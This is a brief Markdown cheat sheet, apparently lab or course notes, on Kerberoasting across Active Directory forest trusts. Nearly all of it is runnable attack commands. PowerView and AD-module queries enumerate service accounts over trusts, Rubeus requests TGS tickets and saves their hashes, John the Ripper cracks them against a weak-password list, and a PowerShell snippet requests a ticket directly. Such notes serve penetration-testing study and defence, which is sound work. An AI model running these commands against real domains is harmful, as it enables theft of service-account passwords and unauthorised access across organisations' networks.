# Cross Forest Attack - Kerberoast

- [Cross Forest Attack - Kerberoast](#cross-forest-attack---kerberoast)
  - [Cross Forest Kerberoasting](#cross-forest-kerberoasting)

<br/>

---

## Cross Forest Kerberoasting

It is possible to execute Kerberoast across Forest trusts. 

To enumerate named service accounts across forest trusts:

- PowerView

```
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```

- AD Module

```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

<br/>

To request a TGS:

```
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

<br/>

To check for the TGS:

```
klist
```

<br/>

To crack the password used to encrypt the TGS:

```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

<br/>

Request TGS across trust using PowerShell:

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

